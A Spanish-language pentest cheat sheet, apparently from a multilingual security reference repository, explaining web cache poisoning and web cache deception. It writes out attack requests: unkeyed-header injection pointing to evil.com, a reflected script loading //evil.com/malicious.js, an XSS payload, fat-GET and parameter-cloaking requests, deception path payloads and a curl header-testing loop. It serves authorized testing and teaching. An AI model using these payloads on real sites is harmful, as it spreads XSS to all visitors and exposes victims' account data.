# 💾 Guía de referencia de envenenamiento de caché web

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.it.md">🇮🇹 Versione Italiana</a> | <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
   ██████╗ █████╗  ██████╗██╗  ██╗███████╗    ██████╗  ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
  ██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝    ██╔══██╗██╔═══██╗██║██╔════╝██╔═══██╗████╗  ██║██║████╗  ██║██╔════╝ 
  ██║     ███████║██║     ███████║█████╗      ██████╔╝██║   ██║██║███████╗██║   ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
  ██║     ██╔══██║██║     ██╔══██║██╔══╝      ██╔═══╝ ██║   ██║██║╚════██║██║   ██║██║╚██╗██║██║██║╚██╗██║██║   ██║
  ╚██████╗██║  ██║╚██████╗██║  ██║███████╗    ██║     ╚██████╔╝██║███████║╚██████╔╝██║ ╚████║██║██║ ╚████║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    ╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Qué es el envenenamiento de caché

El **envenenamiento de caché web (Web Cache Poisoning)** aprovecha el comportamiento de la caché para almacenar respuestas maliciosas que después se sirven a otros usuarios.

### Impacto
- 🔴 **XSS masivo** - XSS almacenado dirigido a todos los usuarios
- 🔴 **Alteración del sitio** - Almacenar contenido malicioso en la caché
- 🔴 **DoS** - Almacenar respuestas de error en la caché
- 🔴 **Ataques de redirección** - Redirigir a los usuarios

---

## 🔍 Entender el funcionamiento de la caché

### Claves de caché

> **Configuración real:** las claves no se limitan universalmente a URL y Host. El método, la URI y cabeceras seleccionadas mediante `Vary` pueden intervenir. Las cabeceras enumeradas no son siempre unkeyed; debe comprobarse la caché concreta. Véase [RFC 9111](https://www.rfc-editor.org/rfc/rfc9111.html).
```
# Normalmente se almacena según:
URL + cabecera Host

# NO incluido en la clave (unkeyed):
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
Cabeceras personalizadas
```

### Detectar el uso de caché
```bash
# Buscar cabeceras de caché
curl -I https://target.com

# Indicadores de caché:
X-Cache: HIT
X-Cache-Hits: 5
CF-Cache-Status: HIT
Age: 300
Cache-Control: public, max-age=3600
```

---

## 💉 Inyección en cabeceras no incluidas en la clave

> **Confirmación:** una reflexión o una cabecera HIT no basta para demostrar envenenamiento. Debe comprobarse que la respuesta alterada se almacena y se entrega a una solicitud posterior que no lleve la entrada maliciosa, según explica [PortSwigger](https://portswigger.net/web-security/web-cache-poisoning).

### X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Si la respuesta refleja evil.com:
<script src="//evil.com/malicious.js">
```

### X-Forwarded-Scheme
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

# Puede provocar una redirección o confusión de protocolos
Location: http://target.com/
```

### X-Host
```http
GET / HTTP/1.1
Host: target.com
X-Host: evil.com

# Comprobar si el valor se refleja
```

### X-Original-URL / X-Rewrite-URL
```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Eludir restricciones de rutas
```

---

## 🔥 Técnicas de ataque

### XSS básico mediante envenenamiento de caché
```http
# 1. Encontrar una entrada fuera de la clave que se refleje en la respuesta
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

# 2. La respuesta con XSS se almacena en la caché
# 3. Todos los usuarios reciben XSS desde la caché
```

### Envenenamiento de caché mediante la ruta
```http
# Solicitud con diferentes rutas de origen
GET /page;evil HTTP/1.1
Host: target.com

# Puede almacenarse con una clave distinta de la prevista
```

### Solicitudes GET con cuerpo (fat GET)

> **Errata del ejemplo:** `Content-Length: 25` no coincide con la longitud del cuerpo mostrado. Se conserva la solicitud original como ejemplo esquemático.
```http
GET / HTTP/1.1
Host: target.com
Content-Length: 25

callback=alert(document.domain)

# El cuerpo podría afectar a la respuesta sin formar parte de la clave de caché
```

### Ocultación de parámetros (parameter cloaking)
```http
# Ruby on Rails
GET /page?param=value;callback=evil HTTP/1.1

# Interpretación diferente en la caché y en la aplicación
```

---

## 🛠️ Engaño a la caché web (Web Cache Deception)

### ¡Diferente del envenenamiento!
```
# Envenenamiento: el payload del atacante se almacena para las víctimas
# Engaño: los datos de la víctima se almacenan para el atacante

# Pasos del engaño a la caché web:
1. Hacer que la víctima visite: /account/settings.css
2. El servidor devuelve /account/settings (ignora .css)
3. La caché lo almacena como recurso público
4. El atacante recupera /account/settings.css desde la caché
5. Obtiene datos sensibles de la víctima
```

### Payloads
```
/account/settings/x.css
/account/settings/..%2fx.css
/account/settings%3b.css
/account/settings.css
/account/settings/nonexistent.js
```

---

## 📊 Técnica de variación de la clave (cache buster)

> **Condición:** añadir `cb=random123` solo separa la prueba si ese parámetro forma parte efectiva de la clave; algunas cachés ignoran o normalizan parámetros. No garantiza aislamiento por sí solo.

### Para pruebas
```http
# Añadir un cache buster para evitar afectar a otros usuarios
GET /page?cb=random123 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Cada prueba obtiene una clave de caché única
```

---

## 🛠️ Herramientas

### Param Miner (extensión de Burp)

Los recorridos de menú y la opción "Guess headers" se conservan en inglés para reconocerlos en la interfaz.
```
1. Instalar Param Miner desde BApp Store
2. Right-click request → Extensions → Param Miner
3. "Guess headers"
4. Buscar cabeceras no incluidas en la clave
```

### Pruebas manuales
```bash
# Probar cabeceras
for header in "X-Forwarded-Host" "X-Host" "X-Forwarded-Scheme" "X-Original-URL"; do
    echo "Testing: $header"
    curl -H "$header: evil.com" -I https://target.com
done
```

---

## 📋 Cabeceras habituales fuera de la clave

```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Proto
X-Host
X-Original-URL
X-Rewrite-URL
X-Forwarded-Server
X-HTTP-Method-Override
X-Forwarded-For
True-Client-IP
```

---

## 📚 Recursos

- [Envenenamiento de caché web de PortSwigger](https://portswigger.net/web-security/web-cache-poisoning)
- [Investigación de PortSwigger](https://portswigger.net/research/practical-web-cache-poisoning)
- [Engaño a la caché web (Web Cache Deception)](https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf)

---

<p align="center">
  <b>💾 ¡Explora el envenenamiento de caché!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
